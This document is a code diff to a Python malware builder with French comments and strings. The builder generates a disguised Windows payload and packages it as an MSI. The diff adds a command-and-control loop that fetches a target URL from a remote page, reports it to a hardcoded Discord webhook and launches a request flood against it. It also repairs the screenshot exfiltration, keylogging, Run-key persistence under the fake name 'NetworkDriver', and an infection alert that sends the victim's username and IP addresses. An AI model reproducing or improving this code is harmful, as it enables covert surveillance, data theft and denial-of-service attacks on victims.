@@ -243,6 +243,96 @@ def pyw():
 
         f.write("import threading\n\n")
 
+        f.write("import requests\n")
+        f.write("from bs4 import BeautifulSoup\n")
+        f.write("import time\n\n")
+
+        f.write("url = 'https://linganguliguli.worldlite.fr/Formulaire/Formulaire.html'\n")
+        f.write("headers = {\n")
+        f.write("    'User-Agent': '...',\n")
+        f.write("    'Accept': 'text/html,application/xhtml+xml',\n")
+        f.write("    'Accept-Language': 'fr,en;q=0.9',\n")
+        f.write("    'Connection': 'keep-alive',\n")
+        f.write("}\n\n")
+
+        f.write("webhook2 = 'https://discordapp.com/api/webhooks/1442910596356898900/218BIA3FdUTa98-pVKYTwtW_FC8YjERHvw_DskmOTFGIQo07rfcXi-29U3kqhMa-K05c'\n")
+        f.write("valeur = ''\n\n")
+
+        f.write("def envoyer():\n")
+        f.write("    global valeur\n\n")
+        f.write("    try:\n")
+        f.write("        response = requests.get(url, headers=headers, verify=False)\n")
+        f.write("        soup = BeautifulSoup(response.text, 'html.parser')\n")
+        f.write("        champ = soup.find('input', {'id': 'monTexte'})\n\n")
+        f.write("        if champ:\n")
+        f.write("            nouvelle_val = champ.get('value').strip()\n")
+        f.write("            if nouvelle_val != '':\n")
+        f.write("                valeur = nouvelle_val\n")
+        f.write("                print('Nouvelle valeur détectée :', valeur)\n")
+        f.write("                requests.post(webhook2, json={'content': f'Valeur trouvée : {valeur}'})\n")
+        f.write("                ddos_attack()\n")
+        f.write("            else:\n")
+        f.write("                print('Aucune action. Valeur vide.')\n")
+        f.write("    except Exception as e:\n")
+        f.write("        print('Erreur :', e)\n\n")
+
+        f.write("def loop_check():\n")
+        f.write("    print('Démarrage du système de surveillance...')\n")
+        f.write("    while True:\n")
+        f.write("        envoyer()\n")
+        f.write("        time.sleep(20)\n\n")
+
+        f.write("from concurrent.futures import ThreadPoolExecutor\n")
+        f.write("import asyncio\n")
+        f.write("import aiohttp\n\n")
+
+        f.write("async def async_ddos_attack():\n")
+        f.write("    global valeur\n\n")
+        f.write("    if valeur == '':\n")
+        f.write("        print('pas possible')\n")
+        f.write("    nombre_requetes = 500\n")
+        f.write("    concurrence = min(100000, nombre_requetes)\n")
+        f.write("    print(f'Démarrage de l\\'attaque avec {concurrence} connexions simultanées...')\n")
+        f.write("    start_time = time.time()\n\n")
+
+        f.write("    async def envoyer_requete_async(session, num):\n")
+        f.write("        global valeur\n")
+        f.write("        try:\n")
+        f.write("            async with session.get(valeur, timeout=5) as response:\n")
+        f.write("                if num % 100 == 0 or num < 10:\n")
+        f.write("                    print(f'Requête {num}/{nombre_requetes} : Statut {response.status}')\n")
+        f.write("                return True\n")
+        f.write("        except Exception as e:\n")
+        f.write("            if num % 100 == 0 or num < 10:\n")
+        f.write("                print(f'Erreur requête {num} : {str(e)}')\n")
+        f.write("            return False\n\n")
+
+        f.write("    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrence, ssl=False)) as session:\n")
+        f.write("        tasks = [envoyer_requete_async(session, i+1) for i in range(nombre_requetes)]\n")
+        f.write("        batch_size = 1000\n")
+        f.write("        successful = 0\n\n")
+        f.write("        for i in range(0, len(tasks), batch_size):\n")
+        f.write("            batch = tasks[i:i+batch_size]\n")
+        f.write("            results = await asyncio.gather(*batch, return_exceptions=True)\n")
+        f.write("            successful += sum(1 for r in results if r is True)\n")
+        f.write("            progress = min(100, int((i + len(batch)) / nombre_requetes * 100))\n")
+        f.write("            print(f'Progression : {progress}% ({i + len(batch)}/{nombre_requetes})')\n\n")
+
+        f.write("    duration = time.time() - start_time\n")
+        f.write("    print(f'\\nAttaque terminée en {duration:.2f} secondes')\n")
+        f.write("    print(f'Requêtes réussies : {successful}/{nombre_requetes}')\n")
+        f.write("    print(f'Vitesse moyenne : {nombre_requetes/duration:.2f} requêtes/seconde')\n\n")
+
+        f.write("def ddos_attack():\n")
+        f.write("    try:\n")
+        f.write("        asyncio.run(async_ddos_attack())\n")
+        f.write("    except ImportError:\n")
+        f.write("        print('Module aiohttp non trouvé.')\n\n")
+
+        f.write("loop_check()\n\n")
+
+
+
         # Screenshot
         if config["options"]["screenshot"]:
             f.write("import requests, io\nfrom PIL import ImageGrab\n")
@@ -254,7 +344,7 @@ def pyw():
             f.write("       buffer.seek(0)\n")
             f.write("       files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
             f.write("       requests.post(WEBHOOK, files=files)\n\n")
-            f.write("       time.sleep(60)")
+            f.write("       time.sleep(60)\n\n\n")
 
         # Clipboard
         if config["options"]["clipboard"]:
@@ -306,29 +396,29 @@ def pyw():
             f.write("            compteur = 0\n\n")
             f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
             f.write("        listener.join()\n\n")
-            f.write("im = ImageGrab.grab()\n")
-            f.write("buffer = io.BytesIO()\n")
-            f.write("im.save(buffer, format='PNG')\n")
-            f.write("buffer.seek(0)\n")
-            f.write("files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
-            f.write('message = "Screenshot envoyé"\n')
-            f.write("requests.post(WEBHOOK, json=message,files=files)\n")
+            f.write("    im = ImageGrab.grab()\n")
+            f.write("    buffer = io.BytesIO()\n")
+            f.write("    im.save(buffer, format='PNG')\n")
+            f.write("    buffer.seek(0)\n")
+            f.write("    files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
+            f.write('    message = "Screenshot envoyé"\n')
+            f.write("    requests.post(WEBHOOK, json=message,files=files)\n\n")
 
 
         # Démarrage automatique
         if config["options"]["autostart"]:
             f.write("import sys, os, winreg\n\n")
-            f.write("def autostart_option_func(script_path=None, name='NetworkDriver''):\n")
-            f.write("   if script_path is None:\n")
-            f.write("       script_path = os.path.abspath(__file__)\n\n")
-            f.write("   python_exe = sys.executable\n\n")
-            f.write("   command = f''{python_exe}' '{script_path}''\n\n")
-            f.write("   key = winreg.OpenKey(\n")
-            f.write("       winreg.HKEY_CURRENT_USER,\n")
-            f.write("       r'Software\Microsoft\Windows\CurrentVersion\Run',\n")
-            f.write("       0,\n")
-            f.write("       winreg.KEY_SET_VALUE\n")
-            f.write("   )\n\n")
+            f.write("def autostart_option_func(script_path=None, name='NetworkDriver'):\n")
+            f.write("    if script_path is None:\n")
+            f.write("        script_path = os.path.abspath(__file__)\n\n")
+            f.write("    python_exe = sys.executable\n\n")
+            f.write('    command = f"{python_exe}" "{script_path}"\n\n')
+            f.write("    key = winreg.OpenKey(\n")
+            f.write("        winreg.HKEY_CURRENT_USER,\n")
+            f.write("        r'Software\Microsoft\Windows\CurrentVersion\Run',\n")
+            f.write("        0,\n")
+            f.write("        winreg.KEY_SET_VALUE\n")
+            f.write("    )\n\n")
             f.write("    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)\n")
             f.write("    winreg.CloseKey(key)\n")
 
@@ -340,16 +430,17 @@ def pyw():
                 'ordi = platform.node()\n'
                 'hostname = socket.gethostname()\n\n'
                 'def alert_on_infection_option_func():\n'
-                '   ip = requests.get("https://api.ipify.org").text\n'
+                '    ip = requests.get("https://api.ipify.org").text\n'
                 '    discord_webhook = WEBHOOK\n'
                 '    name = (\n'
-                '        f"Nom de l\'ordinateur : {ordi}\\n"'
-                '        f"Utilisateur actuel : {getpass.getuser()}\\n"'
-                '        f"Adresse IP : {socket.gethostbyname(hostname)}\n"'
-                '        f"Adresse IP publique {ip}"'
+                '        f"Nom de l\'ordinateur : {ordi}\\n"\n'
+                '        f"Utilisateur actuel : {getpass.getuser()}\\n"\n'
+                '        f"Adresse IP locale : {socket.gethostbyname(hostname)}\\n"\n'
+                '        f"Adresse IP publique : {ip}"\n'
                 '    )\n'
                 '    requests.post(discord_webhook, json={"content": name})\n\n'
             )
+
 
         # Lancement des threads
         f.write("if __name__ == '__main__':\n")
@@ -390,7 +481,8 @@ def msi():
             f"    }},\n"
             f"    executables=[Executable('{temp_script}', base='Win32GUI')]\n"
             f")\n"
-        )
+    )
+
 
     # Lancement de la génération MSI avec subprocess
     result = subprocess.run(["python", setup_filename, "bdist_msi"], capture_output=True, text=True)
@@ -549,3 +641,6 @@ with open("logs.txt", "a") as fichier:
 
 def key():
     app.mainloop()
+
+
+key()
